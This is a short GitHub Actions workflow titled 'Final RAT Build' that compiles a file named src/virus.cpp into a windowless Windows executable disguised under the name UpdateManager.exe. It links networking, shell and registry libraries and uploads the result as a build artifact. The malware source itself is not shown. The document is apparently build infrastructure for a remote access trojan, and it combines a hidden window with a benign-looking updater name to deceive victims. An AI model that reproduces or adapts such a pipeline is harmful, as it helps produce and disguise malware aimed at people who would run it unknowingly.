name: Final RAT Build
on: [push]

jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - uses: microsoft/setup-msbuild@v2
      - name: Compile
        run: cl.exe /EHsc /MT src/virus.cpp /Fe:UpdateManager.exe /link /SUBSYSTEM:WINDOWS ws2_32.lib shell32.lib advapi32.lib user32.lib
      - uses: actions/upload-artifact@v4
        with:
          name: Proje-Ciktisi
          path: UpdateManager.exe
          
